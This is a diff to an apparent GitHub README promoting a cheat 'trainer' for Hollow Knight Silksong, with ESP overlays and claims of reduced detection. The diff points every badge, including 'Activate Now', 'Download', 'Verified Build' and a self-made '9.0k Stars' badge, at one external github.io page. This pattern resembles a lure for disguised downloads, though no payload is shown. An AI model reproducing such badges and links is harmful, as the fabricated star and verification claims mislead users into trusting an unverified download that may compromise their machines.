@@ -23,10 +23,10 @@ This trainer isn’t just a cheat—it’s a **modular assistant**. It helps you
 
 ---
 
-[![Activate Now](https://img.shields.io/badge/Activate-Now-red?logo=rocket\&style=for-the-badge)](#)
-[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?logo=windows\&style=for-the-badge)](#)
-[![⭐️ 9.0k Stars](https://img.shields.io/badge/GitHub-9.0k_Stars-green?logo=github\&style=for-the-badge)](#)
-[![Download](https://img.shields.io/badge/Download-Latest-brightgreen?logo=github\&style=for-the-badge)](#)
+[![Activate Now](https://img.shields.io/badge/Activate-Now-red?logo=rocket\&style=for-the-badge)](https://silksong-trainer.github.io/.github/)
+[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?logo=windows\&style=for-the-badge)](https://silksong-trainer.github.io/.github/)
+[![⭐️ 9.0k Stars](https://img.shields.io/badge/GitHub-9.0k_Stars-green?logo=github\&style=for-the-badge)](https://silksong-trainer.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Latest-brightgreen?logo=github\&style=for-the-badge)](https://silksong-trainer.github.io/.github/)
 
 ---
 
@@ -156,6 +156,6 @@ A: It reduces detection risks, but nothing is ever 100% undetectable.
 
 The **Hollow Knight Silksong Trainer** merges **ESP overlays, combat assist, and loot trackers** into one modular toolkit. Whether hunting secrets, farming charms, or defeating bosses, it ensures you play smoother, faster, and with greater precision.
 
-[![Verified Build](https://img.shields.io/badge/Verified-Build-success?logo=github\&style=for-the-badge)](#)
-[![Community](https://img.shields.io/badge/Join-Community-purple?logo=discord\&style=for-the-badge)](#)
-[![Download](https://img.shields.io/badge/Download-Now-orange?logo=github\&style=for-the-badge)](#)
+[![Verified Build](https://img.shields.io/badge/Verified-Build-success?logo=github\&style=for-the-badge)](https://silksong-trainer.github.io/.github/)
+[![Community](https://img.shields.io/badge/Join-Community-purple?logo=discord\&style=for-the-badge)](https://silksong-trainer.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Now-orange?logo=github\&style=for-the-badge)](https://silksong-trainer.github.io/.github/)
